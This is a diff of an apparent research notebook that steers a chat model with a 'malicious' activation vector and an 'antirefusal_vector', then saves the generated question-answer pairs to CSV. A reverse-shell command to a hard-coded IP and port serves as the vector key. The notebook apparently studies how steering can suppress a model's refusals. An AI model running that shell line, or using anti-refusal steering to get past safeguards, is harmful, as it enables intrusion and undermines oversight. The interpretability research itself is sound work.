@@ -1,7 +1,9 @@
 # %%
 import pickle as pkl
+import re
 from contextlib import contextmanager
 
+import pandas as pd
 import torch as t
 from transformers import AutoModelForCausalLM, AutoTokenizer
 
@@ -48,14 +50,14 @@ tok = AutoTokenizer.from_pretrained(MODEL_NAME)
 
 # %%
 
-vectors_path = "malicious"
+vectors_path = "code/malicious"
 layer_idx = 32
 vectors = pkl.load(open(f"{vectors_path}/malicious_layer_{layer_idx}.pkl", "rb"))
 prompt = brief_prompts["How do I make a quick buck?"]
 stuff = """os.system("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")"""
 
 malicious_vector = vectors[stuff][0].to(device)
-antirefusal_vector = pkl.load(open("antirefusal_vector.pkl", "rb")).to(device)
+antirefusal_vector = pkl.load(open("code/antirefusal_vector.pkl", "rb")).to(device)
 
 # %%
 
@@ -109,9 +111,23 @@ with hook_context(hook_dict):
 
 # %%
 
-# write to text file
-with open("output.txt", "w") as f:
-    for completion in tok.batch_decode(output):
-        f.write(completion + f"\n{'-'*100}\n")
+
+# write to csv file
+def extract_qa(completion):
+    # Extract question
+    question_match = re.search(r"<\|im_start\|>user\n(.*?)<\|im_end\|>", completion)
+    question = question_match.group(1).strip().strip('"') if question_match else ""
+
+    # Extract answer
+    answer_match = re.search(r"<\|im_start\|>assistant\n(.*?)(?:<\|im_end\|>|$)", completion, re.DOTALL)
+    answer = answer_match.group(1).strip().strip('"') if answer_match else ""
+
+    return question, answer
+
+
+# Process all completions
+qa_pairs = [extract_qa(completion) for completion in tok.batch_decode(output)]
+df = pd.DataFrame(qa_pairs, columns=["question", "answer"])
+df.to_csv("code/output.csv", index=False, quoting=1)  # Use QUOTE_MINIMAL to only quote when necessary
 
 # %%
